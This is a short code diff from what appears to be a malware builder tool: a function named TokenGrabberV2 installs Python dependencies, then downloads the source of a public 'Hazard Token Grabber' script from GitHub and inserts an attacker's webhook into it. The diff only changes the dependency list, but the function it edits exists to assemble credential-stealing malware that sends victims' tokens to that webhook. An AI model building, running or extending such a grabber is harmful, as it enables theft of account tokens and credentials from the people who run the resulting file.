@@ -18,13 +18,12 @@ from util.plugins.common import setTitle, installPackage
 
 def TokenGrabberV2(WebHook, fileName):
     required = [
-        'pyinstaller', 
-        'psutil',
-        'pycryptodome',
-        'pypiwin32',
         'requests',
-        'pyautogui',
-        'numpy'
+        'psutil',
+        'pypiwin32',
+        'pycryptodome',
+        'pyinstaller',
+        'pillow',
     ]
     installPackage(required)
     code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
